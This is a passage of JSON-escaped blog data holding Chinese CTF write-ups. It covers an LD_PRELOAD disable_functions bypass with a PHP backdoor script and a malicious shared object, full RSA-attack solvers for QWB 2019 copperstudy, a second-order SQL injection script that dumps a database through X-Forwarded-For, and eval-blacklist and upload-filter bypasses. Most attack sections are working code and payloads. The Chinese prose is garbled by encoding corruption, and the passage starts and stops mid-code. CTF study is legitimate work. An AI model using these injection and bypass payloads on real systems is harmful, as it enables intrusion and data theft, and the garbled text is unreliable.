\u0026#39;\u0026#39;\u0026#39;%(dir,base64.b64encode(cmd),dir) print(requests.post(url, data={\u0026#39;backdoor\u0026#39;: payload }).content) print requests.post(url,data={\u0026#39;backdoor\u0026#39;:\u0026#34;print_r(scandir(\u0026#39;%s\u0026#39;));\u0026#34;%dir}).content print requests.post(url,data={\u0026#39;backdoor\u0026#39;:\u0026#34;echo file_get_contents(\u0026#39;%s/ch3n9w\u0026#39;);\u0026#34;%dir}).content è„šæœ¬å†™å¾—å¾ˆçƒ‚ï¼Œæ³¨é‡Šéƒ¨åˆ†å¯ä»¥å¿½ç•¥ï¼Œæ˜¯æˆ‘åœ¨å†™çš„è¿‡ç¨‹ä¸­é‡åˆ°çš„å°é—®é¢˜ã€‚\nç„¶åæœåŠ¡å™¨ä¸Šé¢çš„hack.cæ–‡ä»¶å¦‚ä¸‹ï¼š\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; __attribute__ ((__constructor__)) void angel (void){ system(\u0026#34;/readflag \u0026gt; /tmp/ch3n9w\u0026#34;); } ä½¿ç”¨å‘½ä»¤gcc --share -fPIC hack.c -o hack.soå‘½ä»¤æ¥ç¼–è¯‘å…±äº«æ–‡ä»¶ã€‚åœ¨æœåŠ¡å™¨ç›®å½•ä¸‹é¢å¼€å¯python -m SimpleHTTPServer 80ï¼Œå¹¶è¿è¡Œä¸Šè¿°pythonè„šæœ¬ï¼Œå³å¯çœ‹åˆ°flagã€‚\nps:æ¯ä¸ªäººçš„ç›®å½•ä¼šä¸å®šæ—¶è¢«æœåŠ¡å™¨æ¸…ç©º\nå¦‚æœLD_PRELOADä¸è¡Œå¯ä»¥è€ƒè™‘ä¸Šé€šæ€é©¬\nhttps://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php\n","permalink":"https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/","summary":"\u003cp\u003eè´´å‡ ä¸ªå‚è€ƒé“¾æ¥\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/wfzWebSecuity/p/11213732.html\"\u003ehttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\"\u003ehttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\u003c/a\u003e\u003c/p\u003e","title":"LD_PRELOADåŠ«æŒç±»å‹é¢˜ç›®"},{"content":"å¼ºç½‘æ¯ 2019 copperstudy æ‹–æ‹–æ‹‰æ‹‰ç»ˆäºæŠŠè¿™é¢˜å¤ç°äº†\u0026hellip;\nå¼€å±€è®¡ç®—å“ˆå¸Œ, çˆ†ç ´çˆ†ç ´\nfrom Crypto.Util.number import * import hashlib from pwn import * import gmpy2 r = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26182) r.recvuntil(\u0026#34;hexdigest()=\u0026#34;) digest = r.recvline() r.recvuntil(\u0026#34;\u0026#39;hex\u0026#39;)=\u0026#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(\u0026#39;hex\u0026#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(\u0026#34;found it!\u0026#34;) return ((skr5.decode(\u0026#39;hex\u0026#39;)+long_to_bytes(i)).encode(\u0026#39;hex\u0026#39;)) skr = proof(skr5, digest) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(skr) r.interactive() challenge1 n e c mçš„é«˜ä½ è§£\nn = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 e = 3 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 kbits = 72 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = (m_high + x)^e - c solv = f.small_roots(X=2^kbits, beta=1)[0] print(\u0026#34;x: %s\u0026#34; % hex(int(solv))) challenge2 n e c pçš„é«˜ä½ èƒ½åœ¨nçš„å› å­çš„æ•´æ•°åŸŸä¸­ç­‰äº0ä¹Ÿå¯ä»¥æ„é€ æ–¹ç¨‹\nn=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219 e=65537 c=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 p_high128 = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672 pbits = 128 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = p_high128 + x x0 = f.small_roots(X=2^pbits, beta=0.3)[0] p = p_high128 + int(x0) q = n // p print(\u0026#34;p: %s\u0026#34; % p) print(\u0026#34;q: %s\u0026#34; % q) ç„¶åè§£å‡ºæ˜æ–‡å³å¯\nchallenge3 n e c dçš„ä½512ä½ å°±ç¡¬å¥—\ndef partial_p(p0, kbits, n): PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) nbits = 1024 f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.2) if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p) def find_p(d0, kbits, e, n): X = var(\u0026#39;X\u0026#39;) for k in xrange(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p: return p if __name__ == \u0026#34;__main__\u0026#34;: n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 e=3 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 nbits = n.nbits() kbits = 512 d0 = d \u0026amp; (2^kbits-1) p = find_p(d0, kbits, e, n) print \u0026#34;found p: %d\u0026#34; %p q = n // p print \u0026#34;d: %d\u0026#34; % inverse_mod(e, (p-1)*(q-1)) è§£å‡ºæ˜æ–‡å‘é€\nchallenge4 n1 c1 n2 c2 n3 c3 e=3 å¸¸è§„çš„å¹¿æ’­æ”»å‡», ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†\nimport gmpy2 from Crypto.Util.number import * e=3 n1=78642188663937191491235684351005990853149481644703243255021321296087539054265733392095095639539412823093600710316645130404423641473150336492175402885270861906530337207734106926328737198871118125840680572148601743121884788919989184318198417654263598170932154428514561079675550090698019678767738203477097731989 c1=23419685303892339080979695469481275906709035609088426118328601771163101123641599051556995351678670765521269546319724616458499631461037359417701720430452076029312714313804716888119910334476982840024696320503747736428099717113471541651211596481005191146454458591558743268791485623924245960696651150688621664860 n2=98174485544103863705821086588292917749386955237408645745685476234349659452606822650329076955303471252833860010724515777826660887118742978051231030080666542833950748806944312437614585352818344599399156268450521239843157288915059003487783576003027303399985723834248634230998110618288843582573006048070816520647 c2=72080679612442543693944655041130370753964497034378634203383617624269927191363529233872659451561571441107920350406295389613006330637565645758727103723546610079332161151567096389071050158035757745766399510575237344950873632114050632573903701015749830874081198250578516967517980592506626547273178363503100507676 n3=91638855323231795590642755267985988356764327384001022396221901964430032527111968159623063760057482761918901490239790230176524505469897183382928646349163030620342744192731246392941227433195249399795012672172947919435254998997253131826888070173526892674308708289629739522194864912899817994807268945141349669311 c3=22149989692509889061584875630258740744292355239822482581889060656197919681655781672277545701325284646570773490123892626601106871432216449814891757715588851851459306683123591338089745675044763551335899599807235257516935037356212345033087798267959242561085752109746935300735969972249665700075907145744305255616 assert(gmpy2.gcd(n1, n2)==1) assert(gmpy2.gcd(n1, n3)==1) def chinese_remainder(N, C): all_n = reduce(lambda a,b: a*b, N) result = 0 for i in range(len(C)): ni = all_n // N[i] ni_inv = gmpy2.invert(ni, N[i]) result += ni_inv * C[i] * ni return result % all_n N = [n1, n2, n3] C = [c1, c2, c3] result = chinese_remainder(N, C) all_n = reduce(lambda a,b: a*b, N) # print all_n i = 0 while True: root, exact = gmpy2.iroot(result+i*all_n, 3) if exact: print root exit(0) i+=1 challenge5 c = encrypt(m) x = encrypt(m+1) n e=3 ç›¸å…³æ¶ˆæ¯æ”»å‡», å¥—ctfwikiçš„å…¬å¼\nimport gmpy2 p1=1 p2=0 c2 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021533447981943498594790549326550460216939216988828130624120379925895123186121819609415184887470233938291227816332249857236198616538782622327476603338806349004620909717360739157545735826670038169284252348037995399308 c1 =112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021552486915464025361447529153776277710423467951041523831865232164370127602772602643378592695459331174613894578701940837730590029577336924367384969935652616989527416027725713616493815764725131271563545176286794438175 n =113604829563460357756722229849309932731534576966155520277171862442445354404910882358287832757024693652075211204635679309777620586814014894544893424988818766425089667672311645586528776360047956843961901352792631908859388801090108188344342619580661377758180391734771694803991493164412644148805229529911069578061 a = 1 b = p1-p2 def getmessage(a, b, c1, c2, n): b3 = gmpy2.powmod(b, 3, n) part1 = b * (c1 + 2 * c2 - b3) % n part2 = a * (c1 - c2 + 2 * b3) % n part2 = gmpy2.invert(part2, n) return part1 * part2 % n message = getmessage(a, b, c1, c2, n) -p2 print message message = hex(message)[2:] print message challenge6 e c n assert(d\u0026lt;nçš„0.27æ¬¡æ–¹) åªè¦då°äºnçš„0.292æ¬¡æ–¹å°±æœ‰Boneh and Durfee attack\nhttps://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage\næ”¹æ”¹æ•°æ®, è·‘ä¸€ä¸‹å°±æœ‰äº†\næ•´åˆ from Crypto.Util.number import * import os import hashlib from pwn import * import gmpy2 r = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26182) r.recvuntil(\u0026#34;hexdigest()=\u0026#34;) digest = r.recvline() r.recvuntil(\u0026#34;\u0026#39;hex\u0026#39;)=\u0026#34;) skr5 = r.recvline()[:-1] def proof(skr5, digest): for i in range(64*256*256, 256*256*256): result = hashlib.sha256(skr5.decode(\u0026#39;hex\u0026#39;) + long_to_bytes(i)).hexdigest() if result == digest: print(\u0026#34;found it!\u0026#34;) return ((skr5.decode(\u0026#39;hex\u0026#39;)+long_to_bytes(i)).encode(\u0026#39;hex\u0026#39;)) skr = proof(skr5, digest) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(skr) # r.interactive() x0 = 0x35343237323432377dL m_high = 2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736 ans1 = long_to_bytes(x0 + m_high).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(ans1) p = 97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487 q = 131093675711613661161476275473445206682597559447006571385482255727609238786596952165801814021602699749876712682307789568113374768689632642728986573211776526473651771104432443501294668372441525987174391472994271054873305324343666279426741897612827889525440428582592216151586138881806196331920758968403508531637 e=65537 c = 627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778 d = gmpy2.invert(e, (q-1)*(p-1)) m = long_to_bytes(pow(c, d, p*q)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) d = 61931015986410954522379841763963945834108214123439860201390512063842165571430799255094107119082046571341221952786658415661511901536119262974324197242727901361853519060099176095718398341546521709753140715090423775413590463159715914497625346364363050316931779727154988269576808476796380941227956316802411370267 n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 m = long_to_bytes(pow(c, d, n)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) m = 2519188594271759205757864486234199030368509477419996746572813835802776507456368520243429255706508061522045 m = long_to_bytes(m).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) m = \u0026#34;464c41477b325e3872736133393863663864663763323636363162623763623635623262396661653235657d\u0026#34; r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) d = 776765455081795377117377680209510234887230129318575063382634593357724998207571 c=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL n = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L m = long_to_bytes(pow(c,d,n)).encode(\u0026#39;hex\u0026#39;) r.recvuntil(\u0026#34;encode(\u0026#39;hex\u0026#39;)=\u0026#34;) r.sendline(m) r.interactive() ","permalink":"https://dragonbox.top/posts/ctf-qwb-copperstudy-record/","summary":"\u003ch2 id=\"å¼ºç½‘æ¯-2019-copperstudy\"\u003eå¼ºç½‘æ¯ 2019 copperstudy\u003c/h2\u003e\n\u003cp\u003eæ‹–æ‹–æ‹‰æ‹‰ç»ˆäºæŠŠè¿™é¢˜å¤ç°äº†\u0026hellip;\u003c/p\u003e\n\u003cp\u003eå¼€å±€è®¡ç®—å“ˆå¸Œ, çˆ†ç ´çˆ†ç ´\u003c/p\u003e","title":"copperstudy-record"},{"content":"web online_proxy ç‰¹å¾: ç¬¬ä¸€æ¬¡ç™»å½•åæºä»£ç å†…å®¹æœ‰å¦‚ä¸‹:\næ¢ä¸€ä¸ªX-Forwarded-For åä¼šå‘ç°currentipæ˜¯æ ¹æ®xffåˆ¤åˆ«çš„\né‚£ä¹ˆæœ‰ç†ç”±è®¤ä¸ºä¸Šä¸€ä¸ªipè¢«å­˜å‚¨è¿›äº†æ•°æ®åº“ä¸­,å¹¶åœ¨æ¯æ¬¡æ£€æµ‹åˆ°è®¿é—®ipå’Œä¸Šä¸€ä¸ªipä¸åŒçš„æ—¶å€™å°±ä¼šæ”¹å˜æ•°æ®åº“. æºç è¿™é‡Œä¹Ÿå†™åˆ°äº†\n$result = query(\u0026#34;select current_ip, last_ip from ip_log where uuid = \u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); if(count($result) \u0026gt; 0) { if($ip !== $result[0][\u0026#39;current_ip\u0026#39;]) { $last_ip = $result[0][\u0026#39;current_ip\u0026#39;]; query(\u0026#34;delete from ip_log where uuid=\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;\u0026#34;); } else { $last_ip = $result[0][\u0026#39;last_ip\u0026#39;]; } } query(\u0026#34;insert into ip_log values (\u0026#39;\u0026#34;.addslashes($uuid).\u0026#34;\u0026#39;, \u0026#39;\u0026#34;.addslashes($ip).\u0026#34;\u0026#39;, \u0026#39;$last_ip\u0026#39;);\u0026#34;); die(\u0026#34;\\n\u0026lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip \u0026#34;.($last_ip !== \u0026#34;\u0026#34; ? \u0026#34;\\nLast Ip: \u0026#34;.$last_ip : \u0026#34;\u0026#34;).\u0026#34; --\u0026gt;\u0026#34;); è§£æ³•:\nå…ˆç”¨1'|1|'1ä½œä¸ºxffè®¿é—®ç½‘ç«™ç½‘ç«™ , è®¿é—®æˆåŠŸä¹‹åæ”¹å˜xff, å†æ¬¡è®¿é—®, è¿™ä¸ªæ—¶å€™ç”±äºå‰åxffä¸ä¸€è‡´, åŸæ¥å­˜å‚¨è¿›æ•°æ®åº“currentipçš„ipè¢«é‡æ–°æå–å‡ºæ¥å­˜è¿›lastipé¡¹ä¸­, å¦‚æœè¿™ä¸ªlastipæ²¡æœ‰è¿‡æ»¤çš„è¯,å°±å¯ä»¥é€ æˆäºŒæ¬¡æ³¨å…¥, äº‹å®ä¸Šä¹Ÿç¡®å®å¦‚æ­¤, ä½†è¿™ä¸ªå¯èƒ½å¾—çŒœ\u0026hellip;\u0026hellip;åœ¨ç¬¬äºŒæ¬¡è®¿é—®ä¹‹å, payloadè¢«é‡æ–°æ’å…¥è¿›æ•°æ®åº“ä¸­, å¸¦ç€ç¬¬äºŒæ¬¡è®¿é—®çš„xffæ¥ç¬¬ä¸‰æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™,å¯ä»¥çœ‹åˆ°\næˆåŠŸæ‰§è¡Œäº†.\næ¬è¿èµµå¸ˆå‚…çš„è„šæœ¬å­¦ä¹ å­¦ä¹ \n#!/usr/bin/env python3 import requests target = \u0026#34;http://localhost:8302/\u0026#34; def execute_sql(sql): print(\u0026#34;[*]è¯·æ±‚è¯­å¥ï¼š\u0026#34; + sql) return_result = \u0026#34;\u0026#34; payload = \u0026#34;0\u0026#39;|length((\u0026#34; + sql + \u0026#34;))|\u0026#39;0\u0026#34; session = requests.session() r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: payload}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) start_pos = r.text.find(\u0026#34;Last Ip: \u0026#34;) end_pos = r.text.find(\u0026#34; --\u0026gt;\u0026#34;, start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\u0026#34;[+]é•¿åº¦ï¼š\u0026#34; + str(length)) for i in range(1, length + 1, 5): payload = \u0026#34;0\u0026#39;|conv(hex(substr((\u0026#34; + sql + \u0026#34;),\u0026#34; + str(i) + \u0026#34;,5)),16,10)|\u0026#39;0\u0026#34; r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: payload}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) r = session.get(target, headers={\u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;glzjin\u0026#39;}) start_pos = r.text.find(\u0026#34;Last Ip: \u0026#34;) end_pos = r.text.find(\u0026#34; --\u0026gt;\u0026#34;, start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;[+]ä½ç½® \u0026#34; + str(i) + \u0026#34; è¯·æ±‚äº”ä½æˆåŠŸ:\u0026#34; + bytes.fromhex(hex(result)[2:]).decode(\u0026#39;utf-8\u0026#39;)) return return_result # è·å–æ•°æ®åº“ print(\u0026#34;[+]è·å–æˆåŠŸï¼š\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\u0026#34;)) # è·å–æ•°æ®åº“è¡¨ print(\u0026#34;[+]è·å–æˆåŠŸï¼š\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = \u0026#39;F4l9_D4t4B45e\u0026#39;\u0026#34;)) # è·å–æ•°æ®åº“è¡¨ print(\u0026#34;[+]è·å–æˆåŠŸï¼š\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = \u0026#39;F4l9_D4t4B45e\u0026#39; AND TABLE_NAME = \u0026#39;F4l9_t4b1e\u0026#39; \u0026#34;)) # è·å–è¡¨ä¸­å†…å®¹ print(\u0026#34;[+]è·å–æˆåŠŸï¼š\u0026#34; + execute_sql(\u0026#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\u0026#34;)) 5555555\nåœ¨addslashesåæ’å…¥æ•°æ®åœ¨æ•°æ®åº“ä¸­æ˜¯è¿™æ ·çš„\nç¬¬äºŒè¡Œæ˜¯æå–å‡ºæ¥ä¸ç»è¿‡addslashesé‡æ–°æ’å…¥çš„ç»“æœ\neasy_calc https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\nhexdec(bin2hex(\u0026#39;/\u0026#39;)); ?+num=scandir(hex2bin(dechex(47))) #è§£ç å‡ºæ¥çš„ä¼šè‡ªåŠ¨å¸¦ä¸Šå¼•å· hexdec(bin2hex(\u0026#39;/f1agg\u0026#39;)); ?+num=file_get_contents(hex2bin(dechex(52115961636711))) æºç æ˜¯è¿™ä¹ˆæ‰§è¡Œè¯­å¥çš„\n$str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo \u0026#39;.$str.\u0026#39;;\u0026#39;); Simple UPload \u0026lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES[\u0026#39;file\u0026#39;] ; if (strstr(strtolower($uploadFile[\u0026#39;name\u0026#39;]), \u0026#34;.php\u0026#34;) ) { return false; } $upload = new \\Think\\Upload();// å®ä¾‹åŒ–ä¸Šä¼ ç±» $upload-\u0026gt;maxSize = 4096 ;// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å° $upload-\u0026gt;allowExts = array(\u0026#39;jpg\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;jpeg\u0026#39;);// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹ $upload-\u0026gt;rootPath = \u0026#39;./Public/Uploads/\u0026#39;;// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½• $upload-\u0026gt;savePath = \u0026#39;\u0026#39;;// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½• $info = $upload-\u0026gt;upload() ; if(!$info) {// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯ $this-\u0026gt;error($upload-\u0026gt;getError()); return; }else{// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯ $url = __ROOT__.substr($upload-\u0026gt;rootPath,1).$info[\u0026#39;file\u0026#39;][\u0026#39;savepath\u0026#39;].$info[\u0026#39;file\u0026#39;][\u0026#39;savename\u0026#39;] ; echo json_encode(array(\u0026#34;url\u0026#34;=\u0026gt;$url,\u0026#34;success\u0026#34;=\u0026gt;1)); } } } æ€è·¯: ç”±äºåªå¯¹\u0026rsquo;file\u0026rsquo;æ–‡ä»¶åšåˆ¤æ–­, æ‰€ä»¥ä¸€æ—¦ä¸Šä¼ å¤šä¸ªæ–‡ä»¶å°±å¯ä»¥ç»•è¿‡,ç„¶åæ ¹æ®æ–‡ä»¶åçš„ç”Ÿæˆæ–¹å¼æ¥çˆ†ç ´phpæ–‡ä»¶ä½ç½®.\ncrypto RSA é¢˜ç›®ç»™å‡ºäº†æ¡ä»¶\nn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L p=gmpy2.next_prime(x*y*z) q=gmpy2.next_prime(z) c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L å› ä¸º\n2**(2019) \u0026gt; 26833491826787145242474...1422L æ‰€ä»¥\n((y%x)**5)%(x%y) = 1 æˆ–è€… 0 æ‰€ä»¥å°†è¿™é¡¹å¿½ç•¥,å†å°†(y+1)/xå¿½ç•¥\ny çº¦ç­‰äº26833491826787145242474...1422Lçš„316æ¬¡æ–¹ y çº¦ç­‰äº83 ç„¶å(y+1)/x å¿…é¡»ä¸ºæ•´æ•° ,ç»“åˆä¸Šè¿°æ¡ä»¶å¯ä»¥è½»æ˜“æ±‚å¾—x=2.y=83\næ¥ä¸‹æ¥\np = xyz + a q = z + b xyzz + xyzb + az + ab = n å¿½ç•¥ab, az, xyzb, æ±‚å‡ºzçš„è¿‘ä¼¼å€¼,ç„¶åè¿™ä¸ªå€¼è‚¯å®šæ¯”çœŸå®çš„zè¦å¤§, å› æ­¤å¯ä»¥æ ¹æ®è¿™ä¸ªå€¼å¾ªç¯å‡ä¸€å¸¦å…¥è¿ç®—æ¥çˆ†ç ´p ,æ±‚å‡ºçš„på¦‚æœå¯ä»¥æ•´é™¤nå°±åœä¸‹.\nimport gmpy2 from Crypto.Util import number n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L # x=2 # y = 83 # z_close = gmpy2.iroot(n//166, 2) z_close = 